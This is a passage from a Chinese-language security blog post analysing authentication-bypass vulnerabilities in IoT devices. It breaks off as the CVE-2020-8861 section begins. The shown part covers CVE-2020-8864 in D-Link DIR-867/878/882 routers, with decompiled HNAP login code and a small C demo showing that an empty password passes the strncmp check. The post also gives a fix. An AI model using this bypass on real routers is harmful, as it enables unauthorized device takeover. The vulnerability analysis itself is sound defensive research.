<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="Catalpa"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://wzt.ac.cn/2020/08/28/bypass_auth/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="Update: 2021-01-18：  修正 CVE-2020-8861 分析过程 在 IoT 漏洞中，身份验证漏洞出现频率较高，并且能够造成的危害很大，通过身份验证的绕过，攻击者可以访问到很多敏感 API，甚至可以结合其他漏洞直接获取设备 shell，给用户带来重大损失。"><meta property="og:type" content="article"><meta property="og:title" content="IoT 设备中身份验证绕过的一些漏洞(1)"><meta property="og:url" content="https://wzt.ac.cn/2020/08/28/bypass_auth/index.html"><meta property="og:site_name" content="Catalpa&#39;s Site"><meta property="og:description" content="Update: 2021-01-18：  修正 CVE-2020-8861 分析过程 在 IoT 漏洞中，身份验证漏洞出现频率较高，并且能够造成的危害很大，通过身份验证的绕过，攻击者可以访问到很多敏感 API，甚至可以结合其他漏洞直接获取设备 shell，给用户带来重大损失。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://wzt.ac.cn/img/aubypass-1.png"><meta property="og:image" content="https://wzt.ac.cn/img/aubypass-2.png"><meta property="article:published_time" content="2020-08-27T16:00:00.000Z"><meta property="article:modified_time" content="2024-10-17T00:23:50.729Z"><meta property="article:author" content="Catalpa"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://wzt.ac.cn/img/aubypass-1.png"><link rel="icon" type="image/png" href="/img/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicon.ico"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/img/favicon.ico"><title>IoT 设备中身份验证绕过的一些漏洞(1) | Catalpa&#39;s Site</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/build/tailwind.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script id="hexo-configurations">window.config={hostname:"wzt.ac.cn",root:"/",language:"en",path:"search.xml"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,delete_mask:!1,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:["网络安全爱好者"]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_sa"},lazyload:!0,pangu_js:!1,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!1,custom_message:null},open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/img/bk.jpg",dark:"/img/bk.jpg"},title:"Welcome!",subtitle:{text:["欢迎来到本站!","今天有什么新鲜事吗?","知识不应该是付费的!","持续学习 持续进步","网络安全爱好者","非常感谢您的捐赠!","祝您拥有美好的一天!"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/rrrrrrri",instagram:null,zhihu:null,twitter:null,email:"anu11@foxmail.com"},qrs:{weixin:null,"fa-solid fa-hand-holding-dollar":"/img/w.png"}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.8.2",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},"归档":{path:"/archives",icon:"fa-regular fa-archive"},"感谢捐赠":{path:"/donates",icon:"fa-solid fa-hand-holding-dollar"}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:"读者有责任遵守其所在国家或地区的所有法律，作者不对使用其文章中提到的任何内容所造成的任何损害负责。",show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!1,limit:3},tags:{enable:!1,limit:3}},footerStart:"2018/9/1 08:00:00"},window.lang_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><main class="page-container" id="swup"><div class="main-content-container flex flex-col justify-between min-h-dvh"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content transition-navbar"><div class="left"><a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/"><img src="/img/favicon.ico" class="w-full h-full rounded-sm"> </a><a class="logo-title" href="/">Catalpa&#39;s Site</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> 归档</a></li><li class="navbar-item"><a href="/donates"><i class="fa-solid fa-hand-holding-dollar fa-fw"></i> 感谢捐赠</a></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>HOME </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>归档 </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/donates"><span>感谢捐赠 </span><i class="fa-solid fa-hand-holding-dollar fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">Tags</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div><div class="label text-third-text-color text-sm">Categories</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">68</div><div class="label text-third-text-color text-sm">Posts</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body transition-fade-up"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">IoT 设备中身份验证绕过的一些漏洞(1)</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/img/logo.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">Catalpa</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">网络安全爱好者</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2020-08-28</span> <span class="mobile">2020-08-28</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2024-10-17 08:23:50</span> <span class="mobile">2024-10-17 08:23:50</span> <span class="hover-info">Updated</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>7.4k Words</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>38 Mins</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p><strong>Update: 2021-01-18： 修正 CVE-2020-8861 分析过程</strong></p><p>在 IoT 漏洞中，身份验证漏洞出现频率较高，并且能够造成的危害很大，通过身份验证的绕过，攻击者可以访问到很多敏感 API，甚至可以结合其他漏洞直接获取设备 shell，给用户带来重大损失。</p><span id="more"></span><h1 id="CVE-2020-8864"><a href="#CVE-2020-8864" class="headerlink" title="CVE-2020-8864"></a>CVE-2020-8864</h1><p>2020 年 2 月 24 日，ZDI 团队披露了存在于 D-Link 多个型号路由器中的身份验证绕过漏洞，通过利用漏洞，攻击者可从 LAN 侧轻易的控制路由器，实现修改 admin 用户密码、篡改路由器默认配置、甚至结合其他漏洞实现蠕虫植入等操作。</p><h2 id="漏洞基本信息"><a href="#漏洞基本信息" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>以下是从披露页面摘抄的漏洞信息</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router.</span><br></pre></td></tr></table></figure></div><p>此漏洞影响 DIR-867, DIR-878, DIR-882 路由器，漏洞产生原因大概是在处理 HNAP 请求过程中，由于缺少了对空密码的验证流程，导致攻击者可以使用空密码绕过身份验证，从而访问敏感 API 接口。</p><p>漏洞类型：身份验证绕过</p><p>漏洞威胁：较高 (8.8)</p><p>漏洞影响：攻击者绕过身份验证，从而访问敏感 API，执行敏感操作。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以去 <a class="link" href="ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-882/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载固件，这里我使用的是 1.10B02 25MB 版本，其中包含了未加密的固件，可以直接拿过来进行解包。</p><p>解包之后简单看一下整个文件系统，web 服务器使用的是 lighttpd，通过查看其配置文件，发现大部分请求都会被转发到 prog.cgi 进行处理。</p><p>拿到 prog.cgi 放进 Ghidra 进行分析，根据漏洞信息，我们需要寻找处理 HNAP 登录请求的代码，先搜索字符串 Login 看一下有没有什么线索。</p><p><img lazyload src="/images/loading.svg" data-src="/img/aubypass-1.png"></p><p>找到了几个包含 login 的字符串，其中第一项 &#x2F;HNAP1&#x2F;login 感觉和请求有关，通过查找交叉引用，找到了函数</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_0041ed9c</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Login&quot;</span>,<span class="number">0xc</span>);</span><br><span class="line">  <span class="keyword">if</span> ((iVar1 == <span class="number">0</span>) || (iVar1 = <span class="built_in">strncmp</span>(*(<span class="type">char</span> **)(param_1 + <span class="number">0xc4</span>),<span class="string">&quot;/HNAP1/Logout&quot;</span>,<span class="number">0xd</span>), iVar1 ==<span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>交叉引用此函数找到了判断 login 请求的函数</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_004249ec</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  </span><br><span class="line">  FUN_00424610(param_1);</span><br><span class="line">  iVar1 = FUN_0041ed9c(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Action&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;request&quot;</span>,<span class="number">7</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;login&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (iVar1 = <span class="built_in">strncmp</span>(__s1,<span class="string">&quot;logout&quot;</span>,<span class="number">6</span>), iVar1 != <span class="number">0</span>)) &#123;</span><br><span class="line">          FUN_00424c88(param_1,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          FUN_00422420(param_1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        hnap_login(param_1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      FUN_004206c0(param_1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00423bd4(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    iVar1 = FUN_00423d70(param_1);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      uVar2 = FUN_00422764(param_1);</span><br><span class="line">      <span class="keyword">return</span> uVar2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = FUN_00424890(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">1</span>) &#123;</span><br><span class="line">    websDefaultHandler(param_1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;/Index.html&quot;</span>,<span class="string">&quot;/Index.html&quot;</span>,*(undefined4 *)(param_1 +<span class="number">0xf8</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  uVar2 = FUN_00423ecc(param_1);</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过取得 &#x2F;Login&#x2F;Action 字段来判断这个请求是登录还是登出。于是可以定位到登录请求函数 hnap_login。</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">hnap_login</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  uchar *data;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *username;</span><br><span class="line">  <span class="type">char</span> *password;</span><br><span class="line">  <span class="type">size_t</span> len;</span><br><span class="line">  EVP_MD *md;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">char</span> *local_378;</span><br><span class="line">  uint local_374;</span><br><span class="line">  <span class="type">char</span> realPassword [<span class="number">512</span>];</span><br><span class="line">  byte abStack352 [<span class="number">128</span>];</span><br><span class="line">  uint local_e0;</span><br><span class="line">  HMAC_CTX HStack220;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(realPassword,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">memset</span>(abStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_378 = realPassword;</span><br><span class="line">  local_e0 = <span class="number">0x80</span>;</span><br><span class="line">  __s = (<span class="type">char</span> *)websGetRequestPrivateKey(param_1);</span><br><span class="line">  data = (uchar *)FUN_0042176c(param_1);</span><br><span class="line">  iVar1 = FUN_00421a44(param_1);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  username = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/Username&quot;</span>);</span><br><span class="line">  password = (<span class="type">char</span> *)webGetVarString(param_1,<span class="string">&quot;/Login/LoginPassword&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((((__s == (<span class="type">char</span> *)<span class="number">0x0</span>) || (data == (uchar *)<span class="number">0x0</span>)) || (username == (<span class="type">char</span> *)<span class="number">0x0</span>)) ||</span><br><span class="line">     ((password == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">      ((iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;Admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span> &amp;&amp;</span><br><span class="line">       (iVar1 = <span class="built_in">strncmp</span>(username,<span class="string">&quot;admin&quot;</span>,<span class="number">5</span>), iVar1 != <span class="number">0</span>)))))) &#123;</span><br><span class="line">LAB_004223b8:</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">4</span>);</span><br><span class="line">    uVar2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    HMAC_CTX_init(&amp;HStack220);</span><br><span class="line">    len = <span class="built_in">strlen</span>(__s);</span><br><span class="line">    md = EVP_md5();</span><br><span class="line">    HMAC_Init_ex(&amp;HStack220,__s,len,md,(ENGINE *)<span class="number">0x0</span>);</span><br><span class="line">    len = <span class="built_in">strlen</span>((<span class="type">char</span> *)data);</span><br><span class="line">    HMAC_Update(&amp;HStack220,data,len);</span><br><span class="line">    HMAC_Final(&amp;HStack220,abStack352,&amp;local_e0);</span><br><span class="line">    HMAC_CTX_cleanup(&amp;HStack220);</span><br><span class="line">    local_374 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (local_374 != local_e0) &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(local_378,<span class="string">&quot;%02x&quot;</span>,(uint)abStack352[local_374]);</span><br><span class="line">      local_374 = local_374 + <span class="number">1</span>;</span><br><span class="line">      local_378 = local_378 + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0041df08(realPassword,<span class="number">0x200</span>);</span><br><span class="line">    __s = (<span class="type">char</span> *)nvram_safe_get(<span class="string">&quot;IsDefaultLogin&quot;</span>);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      len = <span class="built_in">strlen</span>(password);</span><br><span class="line">      iVar1 = <span class="built_in">strncmp</span>(realPassword,password,len);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        FUN_00421dcc(param_1);</span><br><span class="line">        <span class="keyword">goto</span> LAB_004223b8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    FUN_0042194c(param_1);</span><br><span class="line">    FUN_0041fee8(param_1);</span><br><span class="line">    FUN_00424c88(param_1,<span class="number">1</span>);</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> uVar2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这个函数的代码比较多，我用 C 写了一个简化版</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* password = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* realUsername = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* realPassword = <span class="string">&quot;admin888&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strncmp</span>(realUsername, username, <span class="number">5</span>))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Username incorrect!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(password);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(realPassword, password, len))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Success\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>前两个字符串代表用户的请求，后两个代表正确的字符串，代码判断逻辑是要求用户名等于 admin，这没有什么问题，但是在判断密码的时候，首先会使用 strlen 计算用户输入的密码长度，然后带入 strncmp 函数和正确的密码进行比较，如果用户输入的密码为空，那么最终参与 strncmp 比较的 len 就是 0，此时函数会默认返回 0。</p><p>于是验证成功就存在了两种情况，一是密码真的正确，二是密码为空，大家可以自己编译上面的代码试一下。</p><p>修复手段呢？可以在 strlen 计算密码长度之后对长度进行判断，如果等于零就直接返回登录失败。</p><p>经过测试，DIR 878 等型号的路由器对于 HNAP login 请求的处理是相同的，漏洞的成因也是一样。</p><h1 id="CVE-2020-8861"><a href="#CVE-2020-8861" class="headerlink" title="CVE-2020-8861"></a>CVE-2020-8861</h1><p>影响 DAP-1330 Wi-Fi 拓展器。</p><h2 id="漏洞基本信息-1"><a href="#漏洞基本信息-1" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>摘抄漏洞描述如下：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td 